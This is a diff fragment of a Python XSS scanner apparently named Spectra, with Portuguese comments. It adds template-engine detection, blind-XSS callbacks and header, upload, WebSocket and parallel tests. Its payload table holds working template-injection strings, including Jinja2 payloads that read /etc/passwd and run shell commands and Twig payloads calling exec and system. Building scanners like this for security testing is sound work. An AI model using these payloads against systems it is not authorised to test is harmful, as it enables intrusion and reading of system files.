+                    except (json.JSONDecodeError, requests.RequestException):
+                        continue
+                        
+                except requests.RequestException:
+                    continue
+        
+        progress.remove_task(task_id)
+
+    def _detect_template_engine(self, response_text):
+        """Detecta template engines baseado em padrões na resposta."""
+        template_patterns = {
+            'Jinja2': [r'\{\{.*?\}\}', r'\{%.*?%\}', r'jinja', r'flask'],
+            'Twig': [r'\{\{.*?\}\}', r'\{%.*?%\}', r'twig', r'symfony'],
+            'Django': [r'\{\{.*?\}\}', r'\{%.*?%\}', r'django', r'csrf_token'],
+            'Smarty': [r'\{.*?\}', r'\{assign', r'\{if', r'smarty'],
+            'Mustache': [r'\{\{.*?\}\}', r'mustache', r'handlebars'],
+            'Velocity': [r'\$\{.*?\}', r'#set', r'#if', r'velocity'],
+            'FreeMarker': [r'\$\{.*?\}', r'<#.*?>', r'freemarker'],
+            'Thymeleaf': [r'th:', r'thymeleaf', r'\$\{.*?\}'],
+            'JSP': [r'<%.*?%>', r'\$\{.*?\}', r'jsp:', r'jstl'],
+            'Angular': [r'\{\{.*?\}\}', r'ng-', r'angular', r'\[\(.*?\)\]'],
+            'Vue': [r'\{\{.*?\}\}', r'v-', r'vue', r'@click'],
+            'React': [r'react', r'jsx', r'className', r'useState']
+        }
+        
+        detected_engines = {}
+        
+        for engine, patterns in template_patterns.items():
+            confidence = 0
+            for pattern in patterns:
+                matches = len(re.findall(pattern, response_text, re.IGNORECASE))
+                confidence += matches
+            
+            if confidence > 0:
+                detected_engines[engine] = confidence
+        
+        # Retorna engines ordenados por confiança
+        return sorted(detected_engines.items(), key=lambda x: x[1], reverse=True)
+
+    def _scan_template_injection_xss(self, tasks, progress):
+        """Executa scan específico para XSS via Template Injection."""
+        task_id = progress.add_task("[orange3]Scan Template Injection XSS...", total=len(tasks))
+        
+        # Payloads específicos para diferentes template engines
+        template_payloads = {
+            'Jinja2': [
+                "{{7*7}}",
+                "{{config.items()}}",
+                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+            ],
+            'Twig': [
+                "{{7*7}}", 
+                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+                "{{['id']|filter('system')}}"
+            ],
+            'Smarty': [
+                "{php}echo 7*7;{/php}",
+                "{literal}<script>alert('smarty-xss-spectra')</script>{/literal}"
+            ],
+            'Angular': [
+                "{{7*7}}",
+                "{{constructor.constructor('alert(\"angular-xss-spectra\")')()}}",
+                "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a'].map(toString.constructor.prototype.toString,'alert(\"angular-xss-spectra\")')}}"
+            ],
+            'Generic': [
+                "${7*7}",
+                "#{7*7}",
+                "{{7*7}}",
+                "%{7*7}",
+                "<script>alert('template-xss-spectra')</script>"
+            ]
+        }
+        
+        for method, url, param, form_data in tasks:
+            progress.update(task_id, advance=1, description=f"[orange3]Testando Template Injection em [cyan]{param}[/cyan]...")
+            
+            # Primeiro, detecta o template engine
+            try:
+                if method.lower() == 'get':
+                    detect_response = self.session.get(url, timeout=7, verify=False)
+                else:
+                    detect_response = self.session.post(url, data=(form_data or {}), timeout=7, verify=False)
+                
+                detected_engines = self._detect_template_engine(detect_response.text)
+                
+                # Escolhe payloads baseados na detecção
+                selected_payloads = []
+                if detected_engines:
+                    # Usa payloads específicos do engine detectado
+                    top_engine = detected_engines[0][0]
+                    selected_payloads.extend(template_payloads.get(top_engine, []))
+                    
+                    if self.verbose:
+                        print_info(f"Template engine detectado: [yellow]{top_engine}[/yellow] em [cyan]{url}[/cyan]")
+                else:
+                    # Usa payloads genéricos
+                    selected_payloads.extend(template_payloads['Generic'])
+                
+                # Testa payloads selecionados
+                for payload in selected_payloads[:5]:
+                    test_data = {param: payload}
+                    
+                    try:
+                        if method.lower() == 'get':
+                            response = self.session.get(url, params=test_data, timeout=7, verify=False)
+                        else:
+                            post_payload = (form_data or {}).copy()
+                            post_payload[param] = payload
+                            response = self.session.post(url, data=post_payload, timeout=7, verify=False)
+                        
+                        self.stats['total_requests'] += 1
+                        
+                        # Verifica execução de template injection
+                        if '49' in response.text and '7*7' in payload:  # 7*7 = 49
+                            detail = f"Template Injection XSS no parâmetro '{param}' em {url}"
+                            rec = f"Template injection confirmado: payload '{payload}' executou matemática (7*7=49)."
+                            
+                            if self.verbose:
+                                print_warning(f"Template Injection detectado em [cyan]{param}[/cyan]: [yellow]{payload}[/yellow]")
+                            
+                            self._add_finding("Alto", "Template Injection XSS", detail, rec)
+                            break
+                        elif payload in response.text and 'script' in payload:
+                            detail = f"Possível Template Injection XSS no parâmetro '{param}' em {url}"
+                            rec = f"Payload '{payload}' foi refletido. Verificar execução manual."
+                            
+                            self._add_finding("Médio", "Template Injection XSS (Suspeito)", detail, rec)
+                            
+                    except requests.RequestException:
+                        continue
+                        
+            except requests.RequestException:
+                continue
+        
+        progress.remove_task(task_id)
+
     def _mine_parameters(self, response_text, base_url):
         """Extrai parâmetros potenciais do JavaScript e HTML."""
         if not self.parameter_mining:
@@ -985,8 +1779,9 @@ class XSSScanner:
             # Display inicial seguindo padrão Spectra
             print_info("Scanner Avançado de XSS - Spectra")
             print_info(f"Alvo: [bold cyan]{self.base_url}[/bold cyan]")
-            print_info(f"Funcionalidades: DOM {'[bold green]✓[/bold green]' if self.dom_verification else '[bold red]✗[/bold red]'} | Mining {'[bold green]✓[/bold green]' if self.parameter_mining else '[bold red]✗[/bold red]'} | WAF {'[bold green]✓[/bold green]' if self.waf_fingerprint else '[bold red]✗[/bold red]'} | Encoding {'[bold green]✓[/bold green]' if self.encoding_variations else '[bold red]✗[/bold red]'}")
-            print_info(f"Modos: Reflected {'[bold green]✓[/bold green]' if True else '[bold red]✗[/bold red]'} | Stored {'[bold green]✓[/bold green]' if self.scan_stored else '[bold red]✗[/bold red]'} | DOM {'[bold green]✓[/bold green]' if self.fuzz_dom else '[bold red]✗[/bold red]'}")
+            print_info(f"Funcionalidades: DOM {'[bold green]✓[/bold green]' if self.dom_verification else '[bold red]✗[/bold red]'} | Mining {'[bold green]✓[/bold green]' if self.parameter_mining else '[bold red]✗[/bold red]'} | WAF {'[bold green]✓[/bold green]' if self.waf_fingerprint else '[bold red]✗[/bold red]'} | Parallel {'[bold green]✓[/bold green]' if self.parallel_testing else '[bold red]✗[/bold red]'}")
+            print_info(f"Testes: Reflected {'[bold green]✓[/bold green]'} | Stored {'[bold green]✓[/bold green]' if self.scan_stored else '[bold red]✗[/bold red]'} | DOM {'[bold green]✓[/bold green]' if self.fuzz_dom else '[bold red]✗[/bold red]'} | Headers {'[bold green]✓[/bold green]' if self.test_headers else '[bold red]✗[/bold red]'} | Upload {'[bold green]✓[/bold green]' if self.test_file_upload else '[bold red]✗[/bold red]'}")
+            print_info(f"Avançado: Blind {'[bold green]✓[/bold green]' if self.blind_xss_callback else '[bold red]✗[/bold red]'} | WebSocket {'[bold green]✓[/bold green]'} | API/JSON {'[bold green]✓[/bold green]'} | Templates {'[bold green]✓[/bold green]'} | Cache {'[bold green]✓[/bold green]'}")
             console.print("-" * 60)
         
         try:
@@ -1049,19 +1844,56 @@ class XSSScanner:
             # Execução dos scans com progress melhorado
             with create_progress() as progress:
                 
-                # 1. Scan de XSS Refletido Avançado
+                # 1. Scan de Headers XSS (se ativado)
+                if self.test_headers:
+                    if self.verbose:
+                        print_info("Iniciando scan de XSS em Headers HTTP...")
+                    self._scan_header_xss(self.base_url, progress)
+                
+                # 2. Scan de XSS Refletido (Paralelo ou Avançado)
                 if tasks:
                     if self.verbose:
                         print_info(f"Iniciando scan de XSS Refletido para [cyan]{len(tasks)}[/cyan] parâmetros...")
-                    self._scan_reflected_advanced(tasks, progress, waf_info)
+                    if self.parallel_testing and len(tasks) >= 3:
+                        self._scan_reflected_parallel(tasks, progress, waf_info)
+                    else:
+                        self._scan_reflected_advanced(tasks, progress, waf_info)
                 
-                # 2. Scan de DOM XSS (se ativado)
+                # 3. Scan de Blind XSS (se callback URL configurado)
+                if self.blind_xss_callback and tasks:
+                    if self.verbose:
+                        print_info("Iniciando scan de Blind XSS...")
+                    self._scan_blind_xss(tasks, progress)
+                
+                # 4. Scan de DOM XSS (se ativado)
                 if self.fuzz_dom and tasks:
                     if self.verbose:
-                        print_info(f"Iniciando scan de DOM XSS com Selenium...")
+                        print_info("Iniciando scan de DOM XSS com Selenium...")
                     self._scan_dom_xss(tasks, progress)
                 
-                # 3. Scan de XSS Armazenado (se ativado)  
+                # 5. Scan de File Upload XSS (se ativado)
+                if self.test_file_upload and forms:
+                    if self.verbose:
+                        print_info("Iniciando scan de XSS via File Upload...")
+                    self._scan_file_upload_xss(forms, progress)
+                
+                # 6. Scan de WebSocket XSS
+                if self.verbose:
+                    print_info("Iniciando scan de WebSocket XSS...")
+                self._scan_websocket_xss(self.base_url, progress)
+                
+                # 7. Scan de API/JSON XSS
+                if self.verbose:
+                    print_info("Iniciando scan de API/JSON XSS...")
+                self._scan_api_json_xss(self.base_url, progress)
+                
+                # 8. Scan de Template Injection XSS
+                if tasks:
+                    if self.verbose:
+                        print_info("Iniciando scan de Template Injection XSS...")
+                    self._scan_template_injection_xss(tasks, progress)
+                
+                # 9. Scan de XSS Armazenado (se ativado)  
                 if self.scan_stored and forms:
                     post_forms = [form for form in forms if form.get('method', 'get').lower() == 'post']
                     if post_forms:
@@ -1221,9 +2053,11 @@ def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False,
              enable_bypasses=True, context_analysis=True, validate_execution=True, 
              analyze_csp=True, verbose=False, return_findings=False,
              dom_verification=True, parameter_mining=True, waf_fingerprint=True,
-             encoding_variations=True, headless_mode=True):
+             encoding_variations=True, headless_mode=True, blind_xss_callback=None,
+             test_headers=True, test_file_upload=True, parallel_testing=True, 
+             max_workers=5):
     """
-    Executa scan avançado de XSS inspirado no DALFOX.
+    Executa scan avançado de XSS com novas funcionalidades implementadas.
     
     Args:
         url (str): URL alvo para o scan
@@ -1233,22 +2067,34 @@ def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False,
         enable_bypasses (bool): Ativar técnicas de bypass
         context_analysis (bool): Ativar análise de contexto
         validate_execution (bool): Ativar validação de execução
-        analyze_csp (bool): Ativar análise de CSP
-        verbose (bool): Modo verbose - exibe informações detalhadas durante o scan incluindo:
-                       contextos detectados, vulnerabilidades encontradas em tempo real,
-                       análise de WAF/CSP, parâmetros minerados e fases do scan
+        analyze_csp (bool): Ativar análise de CSP aprimorada
+        verbose (bool): Modo verbose - exibe informações detalhadas durante o scan
         return_findings (bool): Se True, retorna lista de vulnerabilidades
         dom_verification (bool): Ativar verificação DOM com Selenium
         parameter_mining (bool): Ativar mineração de parâmetros
         waf_fingerprint (bool): Ativar detecção de WAF
         encoding_variations (bool): Ativar variações de encoding
         headless_mode (bool): Executar Selenium em modo headless
+        blind_xss_callback (str): URL para receber callbacks de Blind XSS
+        test_headers (bool): Ativar testes de XSS em headers HTTP
+        test_file_upload (bool): Ativar testes de XSS via file upload
+        parallel_testing (bool): Ativar processamento paralelo de parâmetros
+        max_workers (int): Número máximo de threads paralelas (padrão: 5)
     
     Returns:
         list ou None: Lista de vulnerabilidades encontradas se return_findings=True
+        
+    Novas funcionalidades implementadas:
+        - Blind XSS detection com callbacks externos
+        - XSS testing em headers HTTP (User-Agent, Referer, etc.)
+        - XSS via file upload (SVG, HTML, XML)
+        - Análise CSP melhorada com técnicas de bypass
+        - Processamento paralelo para melhor performance
+        - Thread-safety para execução segura
     """
     scanner = XSSScanner(url, custom_payloads_file=custom_payloads_file, 
-                        scan_stored=scan_stored, fuzz_dom=fuzz_dom)
+                        scan_stored=scan_stored, fuzz_dom=fuzz_dom,
+                        blind_xss_callback=blind_xss_callback)
     
     # Configurações avançadas
     scanner.enable_bypasses = enable_bypasses
@@ -1261,5 +2107,9 @@ def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False,
     scanner.waf_fingerprint = waf_fingerprint
     scanner.encoding_variations = encoding_variations
     scanner.headless_mode = headless_mode
+    scanner.test_headers = test_headers
+    scanner.test_file_upload = test_file_upload
+    scanner.parallel_testing = parallel_testing
+    scanner.max_workers = max_workers
     
     return scanner.run_scan(return_findings=return_findings)
